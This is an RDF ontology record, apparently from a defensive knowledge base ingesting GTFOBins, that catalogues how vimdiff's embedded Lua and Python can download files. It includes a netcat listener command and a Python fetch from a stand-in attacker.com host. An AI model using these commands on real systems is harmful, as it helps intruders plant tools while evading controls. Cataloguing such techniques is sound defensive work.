mknd:command_vimdiff-file-download a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "vimdiff-file-download" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.",
        "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request." ;
    d3f:uses mknd:executable_vimdiff ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_vimdiff ;
    mknd:provides mknd:function_file-download ;
    mknd:value """export LPORT=12345
export LFILE=file_to_save
vimdiff -c ':lua local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  local d,x=c:receive("*a");
  c:close();
  local f=io.open(os.getenv("LFILE"), "wb");
  f:write(d);
  io.close(f);'
""",
        """export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
vimdiff -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])
vim.command(":q!")'
""" .

